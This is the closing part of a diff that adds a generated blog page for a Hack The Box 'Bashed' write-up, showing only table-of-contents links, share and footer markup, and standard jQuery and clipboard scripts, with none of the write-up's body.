toc-level-3"><a class="toc-link" href="#http-bashed-htb-dev"><span class="toc-number">2.0.4.</span> <span class="toc-text">http:&#x2F;&#x2F;bashed.htb&#x2F;dev</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Root"><span class="toc-number">3.</span> <span class="toc-text">Getting Root</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k1ckstand.github.io/2022/07/21/bashed/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k1ckstand.github.io/2022/07/21/bashed/&text=HTB: Bashed"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k1ckstand.github.io/2022/07/21/bashed/&is_video=false&description=HTB: Bashed"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB: Bashed&body=Check out this article: https://k1ckstand.github.io/2022/07/21/bashed/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k1ckstand.github.io/2022/07/21/bashed/&title=HTB: Bashed"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k1ckstand.github.io/2022/07/21/bashed/&name=HTB: Bashed&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k1ckstand.github.io/2022/07/21/bashed/&t=HTB: Bashed"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    k1ckstand
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
+
+
